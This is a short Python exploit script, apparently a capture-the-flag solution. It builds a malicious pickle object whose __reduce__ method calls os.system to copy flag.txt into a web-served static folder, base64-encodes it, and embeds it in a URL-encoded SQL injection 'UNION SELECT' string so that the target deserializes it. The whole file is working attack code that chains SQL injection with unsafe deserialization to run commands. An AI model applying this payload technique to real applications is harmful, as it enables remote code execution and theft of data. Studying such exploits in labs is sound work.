import pickle
import base64
import os
import urllib.parse as url_encode

class Exploit:
    def __reduce__(self):
        cmd = ('cp flag.txt application/static/.')
        return os.system, (cmd,)

def pickling():
    pickled = pickle.dumps(Exploit())
    payload = base64.urlsafe_b64encode(pickled).decode('ascii')
    return payload

def convert_to_url(x):
    sql_cmd = f"' UNION SELECT '{x}"
    encoding = url_encode.quote(sql_cmd)
    return encoding


if __name__ == '__main__':
    #pickled = pickle.dumps(Exploit())
    #print(base64.urlsafe_b64encode(pickled))
    x = pickling()
    print(convert_to_url(x))

